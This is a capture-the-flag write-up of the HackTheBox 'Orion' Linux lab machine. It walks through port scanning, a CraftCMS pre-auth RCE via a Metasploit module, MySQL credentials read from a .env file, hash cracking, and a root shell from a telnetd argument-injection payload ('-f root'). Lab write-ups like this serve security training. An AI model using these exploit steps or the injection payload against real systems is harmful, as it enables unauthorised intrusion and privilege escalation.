---
title: Orion Machine Writeup
date: 2026-07-20
categories: [HackTheBox, Linux]
tags: [Linux, HTB]
image: /assets/img/orion/banner.img.png
description: Full walkthrough of the Orion HTB machine.
---

Machine : Linux
Easy

> - What is works for me
> - Take a note of the methodology and enumrate that step by step
{: .prompt-tip }

Whenever solving the machine i start with Nmap to scan ip,port and services.
## Initial Scan:

Port Scan :

```bash
nmap --min-rate 10000  10.129.244.146                                                                                                                 [10:16:30]
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-20 10:16 IST
Nmap scan report for 10.129.244.146
Host is up (0.15s latency).
Not shown: 872 filtered tcp ports (no-response), 126 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
```

Script Scan :

```bash
nmap -sCV  -p 80,22  10.129.244.146 -Pn                                                                                                               [10:29:39]
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-20 10:30 IST
Nmap scan report for 10.129.244.146
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.47 seconds
```

10.129.76.198 redirect to orion.htb , Add to hosts file "echo "10.129.76.198 orion.htb" | sudo tee -a /etc/hosts" 

![Enumeration Screenshot](/assets/img/orion/orion1.png)

The web application doesn't have any intersting endpoint ,so i did directory fuzzing and i got /admin.Also that is redirecting to login page

```bash
orca:orion/ $ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u http://orion.htb/FUZZ 

/'___\  /'___\           /'___\
/\ \__/ /\ \__/  __  __  /\ \__/
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
\ \_\   \ \_\  \ \____/  \ \_\
\/_/    \/_/   \/___/    \/_/

v2.1.0-dev
________________________________________________

:: Method           : GET
:: URL              : http://orion.htb/FUZZ
:: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 287ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 252ms]
```


![CraftCMS Login](/assets/img/orion/orion2.png)

Found craftCMS admin login page with craftcms version 5.6.16.

I searched the Vuln for craftCMS 5.6.16  and found the blog which is explain issue in craftcms and Yii framework.

Blog -[CVE -2025-32432](https://www.opswat.com/blog/cve-2025-32432-unauthenticated-remote-code-execution-in-craft-cms)

![CVE Screenshot](/assets/img/orion/orion3.png)

Also the exploit available in msfconsole 

1. use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
2. set RHOST,LHOST and LPORT
3. exploit

Once you got the shell upgrade the shell or get another shell via nc and upgrade the shell.

---
## User Shell

After get into the www-data user shell, user will land on ~/html/craft/web path. In this path nothing intersting stuff,So move one step back directory.There is a .env file. I found MySQL credentials in the `.env` file.

```bash
www-data@orion:~/html/craft$ cat .env
# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=dev

# General settings
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://orion.htb/
```

Then login with the creds and get the user's password using the  "SuperSecureCraft123Pass!"

```bash
www-data@orion:~/html/craft$ mysql -u 'root' -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1220
Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> USE orion;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```bash
SHOW * FROM USERS;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '* FROM USERS' at line 1
MariaDB [orion]> SELECT * FROM USERS;
ERROR 1146 (42S02): Table 'orion.USERS' doesn't exist
MariaDB [orion]> SELECT * FROM users
-> ^C
MariaDB [orion]> SELECT * FROM users;
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
| id | photoId | affiliatedSiteId | active | pending | locked | suspended | admin | username | fullName | firstName | lastName | email          | password                 | lastLoginDate       | lastLoginAttemptIp | invalidLoginWindowStart | invalidLoginCount | lastInvalidLoginDate | lockoutDate | hasDashboard | verificationCode | verificationCodeIssuedDate | unverifiedEmail | passwordResetRequired | lastPasswordChangeDate | dateCreated         | dateUpdated         |
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
|  1 |    NULL |             NULL |      1 |       0 |      0 |         0 |     1 | admin    | NULL     | NULL      | NULL     | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS | 2026-03-12 11:25:04 | NULL               | NULL                    |              NULL | NULL                 | NULL        |        1 | NULL             | NULL                       | NULL            |                     0 | 2026-03-12 11:24:51    | 2026-03-06 11:24:45 | 2026-03-12 11:25:04 |
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
1 row in set (0.001 sec)
```

From the Mysql user table found admin's password hash.Crack the password using the hashcat.

`echo  "$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS" > hash.txt'` 

`orca:orion/ $ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt  `

Password cracked - darkangel

login ssh for adam with cracked password.

---
## Root 

Once logged in as user(adam),start enum for privilege escalation.

Start enumerate:
- sudo -l
- check /opt directory

Then i checked the active port :

```bash
adam@orion:~$ ss -tulnp
Netid            State             Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port            Process
udp              UNCONN            0                 0                            127.0.0.53%lo:53                              0.0.0.0:*
udp              UNCONN            0                 0                                  0.0.0.0:68                              0.0.0.0:*
tcp              LISTEN            0                 80                               127.0.0.1:3306                            0.0.0.0:*
tcp              LISTEN            0                 4096                         127.0.0.53%lo:53                              0.0.0.0:*
tcp              LISTEN            0                 511                                0.0.0.0:80                              0.0.0.0:*
tcp              LISTEN            0                 128                                0.0.0.0:22                              0.0.0.0:*
tcp              LISTEN            0                 10                               127.0.0.1:23                              0.0.0.0:*
tcp              LISTEN            0                 128                                   [::]:22                                 [::]:*
```

port 23 is running internally. Then enumerate the services which is run as root

```bash
ps -ef | grep '^root'

root        1000       1  0 12:04 ?        00:00:00 /usr/sbin/inetutils-inetd
```

Run the service and find the version of that

```bash
/usr/sbin/inetutils-inetd -V
inetd (GNU inetutils) 2.2
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by Alain Magloire, Alfred M. Szmidt, Debarshi Ray,
Jakob 'sparky' Kaivo, Jeff Bailey, Jeroen Dekkers, Marcus Brinkmann,
Sergey Poznyakoff, and others.
```

Google for privilleg escalation for the telnet inetd (GNU inetutils) 2.2 exploit. Found the blog - [exploit](https://www.offsec.com/blog/cve-2026-24061/)

Payload use in that CVE 
`USER='-f root' telnet -a 127.0.0.1 23`

Finally got Root shell.

Happy Hacking!

---
